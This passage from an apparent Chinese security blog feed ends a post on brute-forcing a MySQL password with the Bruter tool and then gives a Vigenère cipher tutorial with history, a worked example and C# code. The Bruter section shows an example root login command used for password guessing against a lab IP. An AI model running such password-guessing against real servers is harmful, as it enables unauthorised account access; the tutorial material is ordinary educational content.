alt="Bruter爆破成功"></center></li></ol><h1 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h1><p>​        Bruter是使用类似于<code>mysql -h 192.168.19.136 -P 3306 -u root -p 123456</code>这样的命令不断地尝试来爆破MySQL数据库的密码的。</p><ul><li><font color="red">This host is not allowed to connect to MySQL server</font>：表示MySQL拒绝主机连接，因为MySQL默认是不允许远程连接的。</li><li><font color="red">Login errors MAXRETRY times consecutively</font>：表示MySQL的连接得不到回应，自动停止连接。</li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>[MySQL远程连接数据库](</li></ul>]]></content>
      
      
      <categories>
          
          <category> debug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> 爆破 </tag>
            
            <tag> Bruter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VigenereCipher</title>
      <link href="/2020/08/22/vigenerecipher/"/>
      <url>/2020/08/22/vigenerecipher/</url>
      
        <content type="html"><![CDATA[<h1 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h1><p><strong>介绍</strong>：</p><p>​        <strong>维吉尼亚密码</strong>（又译 <strong>维热纳尔密码</strong>）是使用一系列<strong>凯撒密码</strong>组成密码字母表的加密算法，属于<strong>多表密码</strong>的一种简单形式。</p><p>​        维吉尼亚密码曾多次被发明。该方法最早记录在吉奥万·巴蒂斯塔·贝拉索（ Giovan Battista Bellaso）于1553年所著的书《吉奥万·巴蒂斯塔·贝拉索先生的密码》中。然而，后来在19世纪时被误传为是法国外交官布莱斯·德·维吉尼亚所创造，因此现在被称为“维吉尼亚密码”。</p><p>​        维吉尼亚密码以其简单易用而著称，同时初学者通常难以破解，因而又被称为“不可破译的密码”。这也让很多人使用维吉尼亚密码来加密的目的就是为了将其破解。</p><p><strong>历史</strong>：</p><p>​        多表密码最早在1467年左右由莱昂·巴蒂斯塔·阿尔伯蒂提出，他使用了一个金属<strong>密码盘</strong>来切换密码表，只是这个系统只能做些有限的转换。后来1508年时，约翰尼斯·特里特米乌斯《<strong>隐写术</strong>》（Steganographia）中发明的表格法（tabula recta）成为了维吉尼亚密码的关键部分。然而当时此方法只能对密码表做一些简单的、可预测的切换。这一加密技术也称为<strong>特里特米乌斯密码</strong>。  </p><p>​        这一方法真正出现是在吉奥万·巴蒂斯塔·贝拉索于1553年所著的书《吉奥万·巴蒂斯塔·贝拉索先生的算术》中。他以特里特米乌斯的表格法为基础，同时引入了密钥的概念。</p><p>​        布莱斯·德·维吉尼亚于1586年亨利三世时期发明了更为简单却又更有效的自动密钥密码（autokey cipher）。之后，19世纪时贝拉索的方法被误认为是由维吉尼亚首先发明的。大卫·卡恩在《破译者（The Codebreakers）》中对此表示遗憾，他写道“历史忽略了这一重要贡献，将其归功于维吉尼亚，虽然他对此并不知道”。</p><p>​        由于破译的难度很高，维吉尼亚密码也因此获得了很高的声望。知名作家、数学家查尔斯·路特维奇·道奇森（笔名路易斯·卡罗）在其1868年所编、收于一儿童杂志的《字母表密码（The Alphabet Cipher）》中称其是不可破译的。1917年，《科学美国人》将维吉尼亚密码称为“无法被转化的”。然而，维吉尼亚密码却配不上这样的称号。查尔斯·巴贝奇完成了破译的工作，但他没有将此发表。之后，弗里德里希·卡西斯基（Friedrich Kasiski）于19世纪完全破解并发表了他的方法。甚至在此之前，一些资深密码分析家在16世纪就能偶尔将其破解。</p><p>​        维吉尼亚密码足够地易于使用使其能够作为战地密码。例如，美国南北战争期间南军就使用黄铜密码盘生成维吉尼亚密码。北军则经常能够破译南军的密码。战争自始至终，南军主要使用三个密钥，分别为“Manchester Bluff（曼彻斯特的虚张声势）”、“Complete Victory（完全的胜利）”以及战争后期的“Come Retribution（报应来临）”。</p><p>​        吉尔伯特·维尔南（Gilbert Vernam）曾试图对已被破译的密码进行修补（于1918年创造了维尔南-维尼吉亚密码），然而这终究无济于事。不过维尔南的发明最终促成了一次性密码本的诞生，这是一种理论上不可破译的密码。</p><h1 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h1><p>​        维吉尼亚密码可以说是凯撒密码的升级版，在凯撒密码中，字母表中的每一字母会做一定的偏移，而维吉尼亚密码可以看作是由一些偏移量不同的凯撒密码组成。</p><p>​        为了生成密码，需要使用<strong>表格法</strong>。这一表格（如图1所示）包括了26行字母表，每一行都由前一行向左偏移一位得到。具体使用哪一行字母表进行编译是基于密钥进行的，在过程中会不断地变换。</p><p><strong>举个栗子</strong>：</p><p>使用的维吉尼亚密码表如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/VigenereCipherTable.png" alt="VigenereCipherTable"></center><p><strong>加密</strong>：</p><ul><li><p>假设明文为：</p><p><font color="blue">ATTACKATDAWN</font></p></li><li><p>LEMON为选定关键词，则密钥为：</p><p><font color="blue">LEMONLEMONLE</font></p></li><li><p>将密钥作为<strong>行标识</strong>，明文作为<strong>列标识</strong>，对明文中的字母依次替换为行列相交处的字母，则得到密文：</p><p><font color="blue">LXFOPVEFRNHR</font></p></li></ul><p>明文字符串首字母的加密过程如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/VigenereEncrypt.png" alt="VigenereEncrypt"></center><p><strong>解密</strong>：</p><ul><li><p>假设密文为：</p><p><font color="blue">LXFOPVEFRNHR</font></p></li><li><p>LEMON为选定关键词，则密钥为：</p><p><font color="blue">LEMONLEMONLE</font></p></li><li><p>将密钥作为<strong>行标识</strong>，在该行内查找与其密文一样的字母，该字母对应的列值即为明文，则得到明文：</p><p><font color="blue">ATTACKATDAWN</font></p></li></ul><p>密文字符串首字母的解密过程如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/VigenereDecrypt.png" alt="VigenereDecrypt"></center><p><strong>数学语言描述</strong>：</p><ol><li>首先将字母用数字代替，即：A=0，B=1，C=2，…，Z=25。</li><li>明文空间记为：M</li><li>密文空间记为：C</li><li>密钥空间记为：K<del>m</del></li><li>将偏移量记为：k<del>n</del></li><li>加密操作记为：E<del>(m)</del></li><li>解密操作记为：D<del>(c)</del></li></ol><p>则有：</p><p><strong>加密变换</strong>：<br>$$<br>E(m_1,m_2,…,m_n) = (m_1+k_1 \ mod \ 26,m_2+k_2 \ mod \ 26,..,m_n+k_n \ mod \ 26),(m_i∈M，k_i∈K,n∈N)<br>$$<br><strong>解密变换</strong>：<br>$$<br>E(m_1,m_2,…,m_n) = (m_1-k_1 \ mod \ 26,m_2-k_2 \ mod \ 26,..,m_n-k_n \ mod \ 26),(m_i∈M，k_i∈K,n∈N)<br>$$</p><h1 id="程序设计"><a href="#程序设计" class="headerlink" title="程序设计"></a>程序设计</h1><p><strong>程序流程图</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/VigenereCipherFlowchart.png" alt="VigenereCipherFlowchart"></center><p>注：</p><ul><li>第一次输入一个int型数据op，若<code>op==1</code>则执行加密操作，若<code>op==0</code>则执行解密操作，否则结束程序。</li><li>第二次输入一个字符串，进行加密或解密操作。</li><li>操作结果后显示加密或解密的结果。</li></ul><h1 id="编程实现"><a href="#编程实现" class="headerlink" title="编程实现"></a>编程实现</h1><p><strong>Vigenere类</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Text<span class="token punctuation">;</span><span class="token keyword">namespace</span> Cryptology_Vigenere<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Vigenere</span>    <span class="token punctuation">{</span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 定义全局变量</span>        <span class="token keyword">private</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">,</span><span class="token punctuation">]</span> codeMatrix<span class="token punctuation">;</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 构造函数</span>        <span class="token keyword">public</span> <span class="token function">Vigenere</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 初始化对象时也初始化密码矩阵</span>            <span class="token function">Vigenere_InitCodeMatrix</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 展示密码表</span>            <span class="token function">DisplayCipherTable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 初始化Vigenere密码矩阵</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">Vigenere_InitCodeMatrix</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            codeMatrix <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">char</span><span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//矩阵</span>            <span class="token keyword">char</span> temp<span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                temp <span class="token operator">=</span> <span class="token string">'A'</span><span class="token punctuation">;</span>                temp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>temp <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>j <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>temp <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token string">'Z'</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        codeMatrix<span class="token punctuation">[</span>i<span class="token punctuation">,</span> j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>temp <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">else</span>                    <span class="token punctuation">{</span>                        codeMatrix<span class="token punctuation">[</span>i<span class="token punctuation">,</span> j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>temp <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 展示维吉尼亚密码表</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">DisplayCipherTable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"  "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>j <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>codeMatrix<span class="token punctuation">[</span>i<span class="token punctuation">,</span> j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> Vigenere加密</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// Vigenere加密</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="plaintext">明文&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;param name="key">密钥&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>密文&lt;/returns></span>        <span class="token keyword">internal</span> <span class="token keyword">string</span> <span class="token function">Encrypt</span><span class="token punctuation">(</span><span class="token keyword">string</span> plaintext<span class="token punctuation">,</span> <span class="token keyword">string</span> key<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">int</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//k:密钥计数器</span>            <span class="token keyword">string</span> str <span class="token operator">=</span> plaintext<span class="token punctuation">.</span><span class="token function">ToUpper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> min_mod <span class="token operator">=</span> str<span class="token punctuation">.</span>Length <span class="token operator">></span> key<span class="token punctuation">.</span>Length <span class="token operator">?</span> key<span class="token punctuation">.</span>Length <span class="token punctuation">:</span> str<span class="token punctuation">.</span>Length<span class="token punctuation">;</span>            StringBuilder strBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> str<span class="token punctuation">.</span>Length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token string">'A'</span> <span class="token operator">&amp;&amp;</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token string">'Z'</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    x <span class="token operator">=</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token string">'A'</span><span class="token punctuation">;</span>                    y <span class="token operator">=</span> key<span class="token punctuation">[</span>k<span class="token operator">++</span> <span class="token operator">%</span> min_mod<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token string">'A'</span><span class="token punctuation">;</span>                    strBuilder<span class="token punctuation">.</span><span class="token function">Append</span><span class="token punctuation">(</span>codeMatrix<span class="token punctuation">[</span>x<span class="token punctuation">,</span> y<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                <span class="token punctuation">{</span>                    strBuilder<span class="token punctuation">.</span><span class="token function">Append</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> strBuilder<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> Vigenere解密</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// Vigenere解密</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="ciphertext">密文&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;param name="key">密钥&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>明文&lt;/returns></span>        <span class="token keyword">internal</span> <span class="token keyword">string</span> <span class="token function">Decrypt</span><span class="token punctuation">(</span><span class="token keyword">string</span> ciphertext<span class="token punctuation">,</span> <span class="token keyword">string</span> key<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">int</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span>temp<span class="token punctuation">,</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//k:密钥计数器</span>            <span class="token keyword">string</span> str <span class="token operator">=</span> ciphertext<span class="token punctuation">.</span><span class="token function">ToUpper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> min_mod <span class="token operator">=</span> str<span class="token punctuation">.</span>Length <span class="token operator">></span> key<span class="token punctuation">.</span>Length <span class="token operator">?</span> key<span class="token punctuation">.</span>Length <span class="token punctuation">:</span> str<span class="token punctuation">.</span>Length<span class="token punctuation">;</span>            StringBuilder strBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> str<span class="token punctuation">.</span>Length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token string">'A'</span> <span class="token operator">&amp;&amp;</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token string">'Z'</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    y <span class="token operator">=</span> key<span class="token punctuation">[</span>k<span class="token operator">++</span> <span class="token operator">%</span> min_mod<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token string">'A'</span><span class="token punctuation">;</span>                    temp <span class="token operator">=</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token string">'A'</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>temp <span class="token operator">&lt;</span> y<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//是否发生回环</span>                    <span class="token punctuation">{</span>                        x <span class="token operator">=</span> temp <span class="token operator">+</span> <span class="token number">26</span> <span class="token operator">-</span> y<span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">else</span>                    <span class="token punctuation">{</span>                        x <span class="token operator">=</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token string">'A'</span> <span class="token operator">-</span> y<span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    strBuilder<span class="token punctuation">.</span><span class="token function">Append</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                <span class="token punctuation">{</span>                    strBuilder<span class="token punctuation">.</span><span class="token function">Append</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> strBuilder<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>注：</p><ul><li>先构造一张密码表，并显示加(解)密时使用的表</li><li>加密时<strong>查表</strong>，解密时也<strong>查表</strong></li></ul><p><strong>Program测试类</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> Cryptology_Vigenere<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span>Title <span class="token operator">=</span> <span class="token string">"Vigenere"</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> op<span class="token punctuation">;</span>            <span class="token keyword">string</span> plaintext<span class="token punctuation">,</span> key<span class="token punctuation">,</span> ciphytext<span class="token punctuation">,</span>str<span class="token punctuation">;</span>            Vigenere vig <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vigenere</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"请输入您想要进行的操作：(1:加密,0:解密) ->"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            str <span class="token operator">=</span> Console<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token function">TryParse</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span><span class="token keyword">out</span> op<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>op <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"请输入明文："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    plaintext <span class="token operator">=</span> Console<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"请输入密钥："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    key <span class="token operator">=</span> Console<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    ciphytext <span class="token operator">=</span> vig<span class="token punctuation">.</span><span class="token function">Encrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>                    Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>ciphytext<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>op <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"请输入密文"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    ciphytext <span class="token operator">=</span> Console<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"请输入密钥："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    key <span class="token operator">=</span> Console<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    plaintext <span class="token operator">=</span> vig<span class="token punctuation">.</span><span class="token function">Decrypt</span><span class="token punctuation">(</span>ciphytext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>                    Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                <span class="token punctuation">{</span>                    Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"输入错误程序停止!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"输入错误程序停止!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            Console<span class="token punctuation">.</span><span class="token function">ReadKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h1 id="结果显示"><a href="#结果显示" class="headerlink" title="结果显示"></a>结果显示</h1><p><strong>加密结果</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/EnCrypt.png" alt="EnCrypt"></center><p><strong>解密结果</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/DeCrypt.png" alt="DeCrypt"></center><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>参考链接：</p><p><a href="http://www.baike.com/wiki/维吉尼亚密码" target="_blank" rel="noopener">维吉尼亚密码</a></p><p>[简单的加密算法——维吉尼亚密码](</p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
          <category> 古典密码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> 古典密码 </tag>
            
            <tag> Vigenere </tag>
            
            <tag> 维吉尼亚密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CeasarCipher</title>
      <link href="/2020/08/22/ceasarcipher/"/>
      <url>/2020/08/22/ceasarcipher/</url>
      
